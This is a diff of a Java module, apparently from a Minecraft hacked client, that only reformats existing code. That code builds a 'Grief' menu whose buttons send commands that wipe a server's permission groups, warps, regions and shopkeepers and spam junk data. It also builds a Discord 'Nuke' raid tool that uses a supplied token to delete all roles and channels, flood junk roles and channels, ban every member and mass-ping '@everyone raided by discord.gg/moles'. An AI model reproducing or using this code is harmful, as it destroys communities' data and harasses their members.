@@ -54,7 +54,8 @@ public class ToolsScreen extends Module {
     public ToolsScreen() {
         super("ToolsScreen", "The tools screen", ModuleType.RENDER);
         Events.registerEventHandler(EventType.PACKET_RECEIVE, packet2 -> {
-            if (!enabled) return;
+            if (!enabled)
+                return;
             PacketEvent event = (PacketEvent) packet2;
             if (event.getPacket() instanceof OpenWrittenBookS2CPacket && !alt) {
                 event.setCancelled(true);
@@ -128,90 +129,75 @@ public class ToolsScreen extends Module {
     @Override
     public void enable() {
         if (menu == null) {
-            menu = new PanelsGui(new PanelFrame[]{
-                    new PanelFrame(100, 100, 250, 170, "Grief", new Element[]{
-                            new PanelButton(0, 0, -1, "Delete LP Data", () -> {
-                                packetinputmode = "lp";
-                                enabled = true;
-                                ShadowMain.client.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/lp deletegroup "));
-                            }),
-                            new PanelButton(0, 20, -1, "Delete MRL Data", () -> {
-                                packetinputmode = "mrl";
-                                enabled = true;
-                                ShadowMain.client.player.sendChatMessage("/mrl list");
-                            }),
-                            new PanelButton(0, 40, -1, "Disable Skripts", () -> ShadowMain.client.player.sendChatMessage("/sk disable all")),
-                            new PanelButton(0, 60, -1, "Delete Shopkeepers", () -> new Thread(() -> {
-                                ShadowMain.client.player.sendChatMessage("/shopkeeper deleteall admin");
+            menu = new PanelsGui(new PanelFrame[]{new PanelFrame(100, 100, 250, 170, "Grief", new Element[]{new PanelButton(0, 0, -1, "Delete LP Data", () -> {
+                packetinputmode = "lp";
+                enabled = true;
+                ShadowMain.client.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/lp deletegroup "));
+            }), new PanelButton(0, 20, -1, "Delete MRL Data", () -> {
+                packetinputmode = "mrl";
+                enabled = true;
+                ShadowMain.client.player.sendChatMessage("/mrl list");
+            }), new PanelButton(0, 40, -1, "Disable Skripts", () -> ShadowMain.client.player.sendChatMessage("/sk disable all")), new PanelButton(0, 60, -1, "Delete Shopkeepers", () -> new Thread(() -> {
+                ShadowMain.client.player.sendChatMessage("/shopkeeper deleteall admin");
+                Utils.sleep(50);
+                ShadowMain.client.player.sendChatMessage("/shopkeeper confirm");
+            }).start()), new PanelButton(0, 80, -1, "Spam LP Data", () -> {
+                for (int i = 0; i < 100; i++) {
+                    ShadowMain.client.player.sendChatMessage("/lp creategroup " + i + new Random().nextInt(10000));
+                }
+            }), new PanelButton(0, 100, -1, "Delete Warp Data", () -> {
+                packetinputmode = "warps";
+                enabled = true;
+                ShadowMain.client.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/delwarp "));
+            }), new PanelButton(0, 120, -1, "Delete Region Data", () -> {
+                packetinputmode = "worldguard";
+                enabled = true;
+                ShadowMain.client.player.sendChatMessage("/rg list");
+            })}), new PanelFrame(500, 100, 250, 125, "Discord", new Element[]{new StringSettingEditor(0, 0, 240, token), new StringSettingEditor(0, 30, 240, guild), new PanelButton(0, 65, -1, "Nuke", () -> {
+                new Thread(() -> {
+                    final ThreadPoolExecutor pool = new ThreadPoolExecutor(10, 10, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue<Runnable>());
+                    try {
+                        long guildId = Long.valueOf(guild.getValue());
+                        DiscordClient client = new DiscordClient(token.getValue(), true);
+                        for (long role : client.getRoles(guildId)) {
+                            pool.execute(() -> client.deleteRole(guildId, role));
+                            Utils.sleep(50);
+                        }
+                        Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Deleted all roles");
+                        for (int i = 0; i < 250; i++) {
+                            pool.execute(() -> client.createRole(guildId, "moles"));
+                            Utils.sleep(50);
+                        }
+                        Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Flooded roles");
+                        for (long channel : client.getChannels(guildId)) {
+                            pool.execute(() -> client.deleteChannel(channel));
+                            Utils.sleep(50);
+                        }
+                        Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Deleted all channels");
+                        for (int i = 0; i < 500; i++) {
+                            pool.execute(() -> client.createChannel(guildId, 0, "molesontop"));
+                            Utils.sleep(50);
+                        }
+                        Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Flooded channels");
+                        for (long member : client.getMembers(guildId)) {
+                            pool.execute(() -> client.banMember(guildId, member));
+                            Utils.sleep(50);
+                        }
+                        Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Banned Members");
+                        Notification.create(1000, "Raidbot", Notification.Type.INFO, "Sending pings");
+                        for (int i = 0; i < 5; i++) {
+                            for (long channel : client.getChannels(guildId)) {
+                                pool.execute(() -> {
+                                    client.sendMessage(channel, "@everyone raided by discord.gg/moles", true);
+                                });
                                 Utils.sleep(50);
-                                ShadowMain.client.player.sendChatMessage("/shopkeeper confirm");
-                            }).start()),
-                            new PanelButton(0, 80, -1, "Spam LP Data", () -> {
-                                for (int i = 0; i < 100; i++) {
-                                    ShadowMain.client.player.sendChatMessage("/lp creategroup " + i + new Random().nextInt(10000));
-                                }
-                            }),
-                            new PanelButton(0, 100, -1, "Delete Warp Data", () -> {
-                                packetinputmode = "warps";
-                                enabled = true;
-                                ShadowMain.client.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/delwarp "));
-                            }),
-                            new PanelButton(0, 120, -1, "Delete Region Data", () -> {
-                                packetinputmode = "worldguard";
-                                enabled = true;
-                                ShadowMain.client.player.sendChatMessage("/rg list");
-                            })
-                    }),
-                    new PanelFrame(500, 100, 250, 125, "Discord", new Element[]{
-                            new StringSettingEditor(0, 0, 240, token),
-                            new StringSettingEditor(0, 30, 240, guild),
-                            new PanelButton(0, 65, -1, "Nuke", () -> {
-                                new Thread(() -> {
-                                    final ThreadPoolExecutor pool = new ThreadPoolExecutor(10, 10, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue<Runnable>());
-                                    try {
-                                        long guildId = Long.valueOf(guild.getValue());
-                                        DiscordClient client = new DiscordClient(token.getValue(), true);
-                                        for (long role : client.getRoles(guildId)) {
-                                            pool.execute(() -> client.deleteRole(guildId, role));
-                                            Utils.sleep(50);
-                                        }
-                                        Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Deleted all roles");
-                                        for (int i = 0; i < 250; i++) {
-                                            pool.execute(() -> client.createRole(guildId, "moles"));
-                                            Utils.sleep(50);
-                                        }
-                                        Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Flooded roles");
-                                        for (long channel : client.getChannels(guildId)) {
-                                            pool.execute(() -> client.deleteChannel(channel));
-                                            Utils.sleep(50);
-                                        }
-                                        Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Deleted all channels");
-                                        for (int i = 0; i < 500; i++) {
-                                            pool.execute(() -> client.createChannel(guildId, 0, "molesontop"));
-                                            Utils.sleep(50);
-                                        }
-                                        Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Flooded channels");
-                                        for (long member : client.getMembers(guildId)) {
-                                            pool.execute(() -> client.banMember(guildId, member));
-                                            Utils.sleep(50);
-                                        }
-                                        Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Banned Members");
-                                        Notification.create(1000, "Raidbot", Notification.Type.INFO, "Sending pings");
-                                        for (int i = 0; i < 5; i++) {
-                                            for (long channel : client.getChannels(guildId)) {
-                                                pool.execute(() -> {
-                                                    client.sendMessage(channel, "@everyone raided by discord.gg/moles", true);
-                                                });
-                                                Utils.sleep(50);
-                                            }
-                                        }
-                                    } catch (Exception e) {
-                                        e.printStackTrace();
-                                    }
-                                }).start();
-                            }),
-                    })
-            });
+                            }
+                        }
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
+                }).start();
+            }),})});
         }
         ShadowMain.client.setScreen(menu);
         this.setEnabled(false);
